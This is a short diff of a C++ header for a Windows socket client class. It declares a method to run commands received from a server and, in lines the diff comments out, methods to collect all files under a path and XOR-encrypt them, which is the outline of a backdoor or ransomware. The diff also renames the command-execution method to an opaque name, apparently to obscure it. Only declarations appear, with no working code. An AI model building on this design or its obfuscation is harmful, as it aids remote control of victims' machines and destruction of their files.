@@ -18,9 +18,9 @@
 #include <WS2tcpip.h>
 #include <windows.h>
 #include<algorithm>
-#include <filesystem>
+#include <tchar.h>
 
-#define BufferSize 1024
+#define BUFFER_SIZE 1024
 
 #pragma warning(disable:4996)
 #pragma comment (lib, "Ws2_32.lib")
@@ -30,7 +30,7 @@ using namespace std;
 class Connection {
     string ip;
     int port;
-    vector<filesystem::path> *files;
+    //vector<filesystem::path> *files;
     SOCKET sock;
 
 
@@ -48,22 +48,22 @@ public:
     void sendMessage(const char *data);
 
     //Getting command from the server
-    string exec(string &cmd);
+    string e1(string &b1);
 
     //Saving all files in path
-    vector<filesystem::path> &getAllFiles(string path, vector<filesystem::path> files);
+    //vector<filesystem::path> &getAllFiles(string path, vector<filesystem::path> files);
 
     //Encrypt data with xor encryption with key
-    string encryptData(string data, string key);
+    //string encryptData(string data, string key);
 
     //Encrypt all the files in path with xor
-    void encryptFiles(string path);
+    //void encryptFiles(string path);
 
     //Read file in path
-    string readFile(filesystem::path path);
+    //string readFile(filesystem::path path);
 
     //Write data to a file in path
-    void writeToFile(filesystem::path path, string data);
+    //void writeToFile(filesystem::path path, string data);
 
     //Creating the connection
     void connection();
